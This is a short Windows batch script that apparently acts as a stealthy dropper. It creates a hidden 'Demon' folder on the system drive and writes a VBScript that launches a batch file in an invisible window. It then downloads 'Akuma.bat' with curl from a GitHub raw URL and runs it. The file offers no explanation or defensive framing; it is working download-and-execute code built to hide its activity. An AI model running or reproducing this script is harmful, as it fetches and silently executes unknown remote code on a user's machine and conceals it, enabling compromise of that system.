rmdir /s /q %homedrive%\Demon
mkdir %homedrive%\Demon
attrib +h %homedrive%\Demon
cd %homedrive%\Demon
echo Set objShell = CreateObject("WScript.Shell") >> %homedrive%\Demon\Akuma.vbs
echo objShell.Run "%homedrive%\Demon\Akuma.bat", 0, False >> %homedrive%\Demon\Akuma.vbs
curl -L https://raw.githubusercontent.com/l-urk/Akuma/main/Akuma.bat > %homedrive%\Demon\Akuma.bat
start %homedrive%\Demon\Akuma.vbs